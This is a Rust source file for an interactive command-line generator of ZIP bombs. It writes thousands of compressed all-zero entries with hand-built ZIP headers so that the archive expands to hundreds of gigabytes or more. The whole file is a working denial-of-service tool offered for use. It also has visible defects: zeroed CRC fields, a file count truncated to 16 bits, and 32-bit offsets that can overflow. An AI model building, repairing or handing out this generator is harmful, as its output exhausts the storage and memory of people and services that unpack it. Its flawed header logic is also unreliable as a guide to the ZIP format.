use std::{
    fs::File,
    io::{Write, stdout},
    path::Path,
    env,
};

use flate2::write::DeflateEncoder;
use flate2::Compression;

fn main() {
    let mut args = env::args().skip(1);
    let target_size = args.next().unwrap_or_else(|| {
        read_input("Bomb decompressed size (default 500 GB): ", "500 GB")
    });
    let payload_size = args.next().unwrap_or_else(|| {
        read_input("Payload file size (default 1 MB): ", "1 MB")
    });
    let output_zip = args.next().unwrap_or_else(|| {
        read_input("Output zip name (default bomb.zip): ", "bomb.zip")
    });
    let folder_name = args.next().unwrap_or_else(|| {
        read_input("Bomb directory name (default bomb_dir): ", "bomb_dir")
    });
    let total_bytes = parse_bytes(&target_size);
    let payload_bytes = parse_bytes(&payload_size);
    let repeats = total_bytes / payload_bytes;
    if repeats == 0 {
        eprintln!("Error: repeats = 0");
        std::process::exit(1);
    }
    println!("\n  Building ZIP bomb:\n");
    println!("    Payload size:         {} bytes", payload_bytes);
    println!("    Total uncompressed:   {} bytes", total_bytes);
    println!("    File count:           {}", repeats);
    println!("    Output:               {}\n", output_zip);
    let compressed_payload = deflate_zeros(payload_bytes as usize);
    let mut file = File::create(Path::new(&output_zip)).expect("Can't create output file");
    let mut central_directory = Vec::new();
    let mut offset = 0u32;
    for i in 0..repeats {
        let filename = format!("{}/{}.txt", folder_name, i);
        let local_header = make_local_header(&filename, compressed_payload.len() as u32, payload_bytes as u32);
        file.write_all(&local_header).unwrap();
        file.write_all(&compressed_payload).unwrap();
        let central = make_central_header(&filename, compressed_payload.len() as u32, payload_bytes as u32, offset);
        central_directory.extend_from_slice(&central);
        offset += local_header.len() as u32 + compressed_payload.len() as u32;
        let progress = (i * 100) / repeats;
        if progress != 100 || i == repeats - 1 {
            print!("\rProgress: {}%", if i == repeats - 1 { 100 } else { progress });
            std::io::stdout().flush().unwrap();
        }
    }
    let central_dir_offset = offset;
    file.write_all(&central_directory).unwrap();
    let eocd = make_end_of_central_directory(repeats as u16, central_directory.len() as u32, central_dir_offset);
    file.write_all(&eocd).unwrap();
    println!("\n\nCreated ZIP Bomb: {}", output_zip);
}

fn read_input(prompt: &str, default: &str) -> String {
    print!("{}", prompt);
    stdout().flush().unwrap();
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
    let input = input.trim();
    if input.is_empty() {
        default.to_string()
    } else {
        input.to_string()
    }
}

fn parse_bytes(input: &str) -> u128 {
    let units = [
        ("B", 1u128),
        ("KB", 1 << 10),
        ("MB", 1 << 20),
        ("GB", 1 << 30),
        ("TB", 1u128 << 40),
        ("PB", 1u128 << 50),
        ("EB", 1u128 << 60),
        ("ZB", 1u128 << 70),
        ("YB", 1u128 << 80),
    ];
    let input = input.trim().to_uppercase();
    let parts: Vec<&str> = input.split_whitespace().collect();
    if parts.len() != 2 {
        eprintln!("Format: <number> <unit>");
        std::process::exit(1);
    }
    let value: f64 = parts[0].parse().expect("Invalid number");
    let unit = units.iter().find(|(u, _)| *u == parts[1]).expect("Invalid unit").1;
    (value * unit as f64) as u128
}

fn deflate_zeros(size: usize) -> Vec<u8> {
    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(&vec![0u8; size]).unwrap();
    encoder.finish().unwrap()
}

fn make_local_header(filename: &str, compressed_size: u32, uncompressed_size: u32) -> Vec<u8> {
    let mut header = Vec::new();
    header.extend_from_slice(&0x04034b50u32.to_le_bytes());
    header.extend_from_slice(&[20, 0]);
    header.extend_from_slice(&[0, 0]);
    header.extend_from_slice(&[8, 0]);
    header.extend_from_slice(&[0, 0, 0, 0]);
    header.extend_from_slice(&[0, 0, 0, 0]);
    header.extend_from_slice(&compressed_size.to_le_bytes());
    header.extend_from_slice(&uncompressed_size.to_le_bytes());
    header.extend_from_slice(&(filename.len() as u16).to_le_bytes());
    header.extend_from_slice(&[0, 0]);
    header.extend_from_slice(filename.as_bytes());
    header
}

fn make_central_header(filename: &str, compressed_size: u32, uncompressed_size: u32, offset: u32) -> Vec<u8> {
    let mut header = Vec::new();
    header.extend_from_slice(&0x02014b50u32.to_le_bytes());
    header.extend_from_slice(&[20, 0, 20, 0]);
    header.extend_from_slice(&[0, 0]);
    header.extend_from_slice(&[8, 0]);
    header.extend_from_slice(&[0, 0, 0, 0]);
    header.extend_from_slice(&[0, 0, 0, 0]);
    header.extend_from_slice(&compressed_size.to_le_bytes());
    header.extend_from_slice(&uncompressed_size.to_le_bytes());
    header.extend_from_slice(&(filename.len() as u16).to_le_bytes());
    header.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    header.extend_from_slice(&offset.to_le_bytes());
    header.extend_from_slice(filename.as_bytes());
    header
}

fn make_end_of_central_directory(file_count: u16, central_size: u32, central_offset: u32) -> Vec<u8> {
    let mut header = Vec::new();
    header.extend_from_slice(&0x06054b50u32.to_le_bytes());
    header.extend_from_slice(&[0, 0, 0, 0]);
    header.extend_from_slice(&file_count.to_le_bytes());
    header.extend_from_slice(&file_count.to_le_bytes());
    header.extend_from_slice(&central_size.to_le_bytes());
    header.extend_from_slice(&central_offset.to_le_bytes());
    header.extend_from_slice(&[0, 0]);
    header
}
